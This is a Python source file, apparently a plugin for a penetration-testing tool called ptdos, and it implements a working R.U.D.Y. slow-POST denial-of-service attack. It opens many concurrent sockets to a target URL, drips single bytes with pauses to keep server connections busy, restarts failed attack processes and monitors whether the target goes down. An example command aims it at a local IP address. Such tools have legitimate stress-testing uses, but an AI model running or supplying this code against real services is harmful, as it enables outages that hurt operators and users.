"""ptdos extension that adds a rudy attack."""
# python3 ptdos.py -a rudy -dst "http://192.168.0.80/submit.php?name=filip&email=test&phone=777&message=test" -dp 80 -d 20 -st 5 -sq 5

# own libs
from misc.pt_http import rudy_request
from misc.pt_socket import create_socket
from monitoring.ptcheckservice import attack_checkservice_review, attack_append_out_data, print_error
from infrastructure import factory
from misc.globalfuncs import load_user_agents, get_ip_from_dst, parse_url, generate_string
# external libs
from ptlibs.ptmisclib import ptprint, out_ifnot, out_if
from time import time, asctime, sleep
from dataclasses import dataclass
import multiprocessing as mp
import os


@dataclass
class Rudy:

    category: str
    name: str

    def do_rudy_attack(self, url, dst_ip, dstport, my_user_agents, sleeptime, err_proc_list):
        """Multiprocess function that does the rudy attack."""
        sock = create_socket(self.name)
        sock.connect((dst_ip, dstport or 80))
        request = rudy_request(url, my_user_agents)
        sock.send(request)
        while True:
            try:
                sleep(sleeptime)
                sock.send(generate_string(1).encode("UTF-8"))
            except:
                err_proc_list.append(os.getpid())
                break

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""
        socksquant = args['socksquant']
        sleeptime = args['sleeptime']
        dstport = args['dstport']
        url = parse_url(dst)
        dst_ip = get_ip_from_dst(url.hostname)
        process_dict = {}
        total_socks = 0
        # create shared list between processes
        manager = mp.Manager()
        shared_list = manager.list()

        # initialize ua
        my_user_agents = load_user_agents(self.name)

        # checkservice start monitoring
        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)

        try:
            while True:  # while loop to stop the attack after time specified in duration runs out
                if time() - att_start_t_epoch >= duration:
                    ptprint(out_ifnot("Time for the attack is done. Stopping attack and deleting sockets.", "INFO", use_json))
                    total_socks = len(process_dict)
                    for item in list(process_dict):
                        process_dict[item].terminate()
                        del process_dict[item]
                    monitoringprocess()  # stop checkservice end monitoring
                    sleep(1)  # wait for 1 second to stop the monitoring process
                    att_end_t_asc = asctime()  # save attack's ending time
                    attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                    break
                if len(process_dict) < socksquant:
                    process = mp.Process(target=self.do_rudy_attack, args=(url, dst_ip, dstport, my_user_agents, sleeptime, shared_list))
                    process.start()
                    process_dict[process.pid] = process
                # if shared_list is not empty, pop the pid of the faulty process, delete it from process_dict and kill the process
                if shared_list:
                    old_process = process_dict.pop(shared_list.pop())
                    old_process.terminate()
                    new_process = mp.Process(target=self.do_rudy_attack, args=(url, dst_ip, dstport, my_user_agents, sleeptime, shared_list))
                    new_process.start()
                    process_dict[new_process.pid] = new_process

            # append attack outcome data to JSON object or print info to console
            attack_append_out_data(use_json, json_obj, json_no, self.name, duration, att_start_t_asc, att_end_t_asc, url.hostname, total_socks, dstport)

            # append checkservice outcome data to JSON object or print info to console
            monitoring.checkservice_append_out_data(json_obj, use_json, json_no)

            # print JSON object to console if self.use_json == TRUE
            ptprint(out_if(json_obj.get_all_json(), "", use_json))

            return

        except BaseException as err:
            monitoringprocess()  # stop checkservice end monitoring
            return print_error(json_obj, use_json, json_no, self.name, err.args[0])

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"R.U.D.Y. attack options": [
                ["-a", "--attack", "<attack>", "Attack name - rudy"],
                ["-d", "--duration", "<duration>", "Specify attack's duration in seconds. Default 10 seconds."],
                ["-dst", "--destination", "<dst>", "Specify destination URL."],
                ["-dp", "--dstport", "<dstport>", "Specify destination port. Default 80."],
                ["-sq", "--socksquant", "<socksquant>", "Number of concurrent sockets opened. Default 10 sockets."],
                ["-st", "--sleep-time", "<sleeptime>", "Time between keepalive http requests. Default 0 seconds."]
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""


def register() -> None:
    """Register attack in factory."""
    factory.register("rudy", Rudy)
